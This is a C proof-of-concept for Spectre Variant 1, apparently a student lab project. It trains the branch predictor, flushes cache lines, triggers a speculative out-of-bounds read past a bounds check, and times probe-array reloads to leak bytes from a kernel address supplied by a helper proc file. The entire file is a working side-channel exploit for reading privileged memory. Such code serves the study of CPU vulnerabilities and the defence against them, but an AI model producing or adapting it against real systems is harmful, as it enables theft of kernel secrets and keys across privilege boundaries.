/*  SSR - Spectre Variant 1 Proof-of-Concept

    Authors:
        David Rainho
        Gabriel Oliveira
        Jorge Pais
        Tiago Sousa
*/
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <ctype.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <emmintrin.h>
#include <x86intrin.h>

#define DELTA 1024

// Edit these values accordingly
#define MAX_TRIES 70
#define TRAIN_ITER 100
#define CHARACTERS_TO_READ 51
#define CACHE_THRESHOLD 110
#define PROC_FILE "/proc/leakTheAddress"

int sizeBuffer = 777;
uint8_t buffer[777] = {100};
char kernelAddress[21] = "ffff8800aa677001"; // Here we store the value returned from the kernel module
char *array = NULL;

/*  Although we can figure this address from outside the program,
    this is function is necessary as we need the byte we're trying
    to access to be in cache.
    By having this function read the seq_file, we're forcing the kernel
    module to access the memory region, and thus cache it */
void getKernelAddress(){
    int readVal = open(PROC_FILE, O_RDONLY);

    read(readVal, kernelAddress, 18);
    close(readVal);
}

int speculativeExec(volatile size_t a){
    int i;

    // we need to flush size_array bound so that the BPU predicts and executes speculatively
    _mm_clflush(&sizeBuffer);

    for (i = 0; i < 256; ++i)
        _mm_clflush(&array[4096*i + DELTA]);

    // Where the magic happens
    if (a < (size_t)sizeBuffer){ // a is unsigned !
        array[buffer[a] * 4096 + DELTA] += 1; // This hopefully executes speculatively
    }
    return 1337;
}

static uint16_t scores[256];
void reloadSideChannel(){
    unsigned int junk=0;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    int i;

    for(i = 0; i < 256; i++){
        addr = (uint8_t *) &array[i*4096 + DELTA];
        time1 = __rdtscp(&junk);
        junk = *addr;
        time2 = __rdtscp(&junk) - time1;

        if (time2 <= CACHE_THRESHOLD)
            scores[i]++;
    }
}

char singleAttack(size_t offset){
    int i, j;

    for(i = 0; i < 256; i++) scores[i] = 0;

    for(j = 0; j < MAX_TRIES; j++){
        for(i = 0; i < TRAIN_ITER; i++)
            speculativeExec(i);

        _mm_clflush(&sizeBuffer);

        getKernelAddress();
        speculativeExec(offset);
        reloadSideChannel();
    }

    int8_t max = 1;
    for(i = 1; i < 256; i++)
        if(scores[max] < scores[i])
            max = i;

    return (char) max;
}

int main() {
    getKernelAddress();

    //Now we create a Probe array of size 4096 * 256
    //ie. 1 page for every byte possibility
	array = mmap(NULL, 4096 * 256 , PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    memset(array, 0x44, 4096*256);

    // Parse the string
    void * kernelAddr = (void*)strtoul(kernelAddress, NULL, 16);

    // Offset of the victim kernel region from our array
    size_t offset = (uintptr_t)kernelAddr - (uintptr_t)buffer;

    // Now we try to get all the bytes from memory
    for(size_t i = 0; i < CHARACTERS_TO_READ; i++){
        char aa = singleAttack(offset + i*sizeof(char));
        //printf("The secret byte is: 0x%2x - %c\n", (uint8_t) aa, aa);
        if(__isascii(aa))
            printf("%d - %c\n", aa, aa);
        else
            printf("0 - \n");
    }

    return 0;
}
